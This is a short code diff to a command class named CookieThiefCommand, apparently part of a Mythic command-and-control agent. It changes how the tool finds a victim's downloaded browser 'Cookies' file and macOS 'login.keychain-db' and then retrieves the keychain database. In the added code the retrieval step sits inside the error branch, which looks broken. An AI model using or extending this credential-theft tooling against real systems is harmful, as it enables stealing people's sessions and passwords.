@@ -57,12 +57,28 @@ class CookieThiefCommand(CommandBase):
         pass
 
     async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
-        getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id, filename="login.keychain-db")
-        if getkeychainDBResp.status == "success":
-            getkeychainDBResp = getkeychainDBResp.response[0]
-            print("Downloaded KeychainDB filename: " + getkeychainDBResp["filename"])
+        cookiesFileId = " "
+        keychainDBFileId = " "
+        dlResponses = await MythicRPC().execute("get_responses", task_id=task.id)
+        if dlResponses.status == "success":
+            dlResponses = dlResponses.response
+            for responses in dlResponses["files"]:
+                if responses["filename"] == "Cookies":
+                    cookiesFileId = responses["agent_file_id"]
+            for responses in dlResponses["files"]:
+                if responses["filename"] == "login.keychain-db":
+                    keychainDBFileId = responses["agent_file_id"]
         else:
-            print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
+            print("Encountered an error attempting to get responses from tasks: " + dlResponses.error)
             sys.stdout.flush()
+
+            getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id, filename=keychainDBFileId)
+            if getkeychainDBResp.status == "success":
+                getkeychainDBResp = getkeychainDBResp.response[0]
+                print("Downloaded KeychainDB file_id: " + getkeychainDBResp["agent_file_id"])
+                sys.stdout.flush()
+            else:
+                print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
+                sys.stdout.flush()
 
         return task
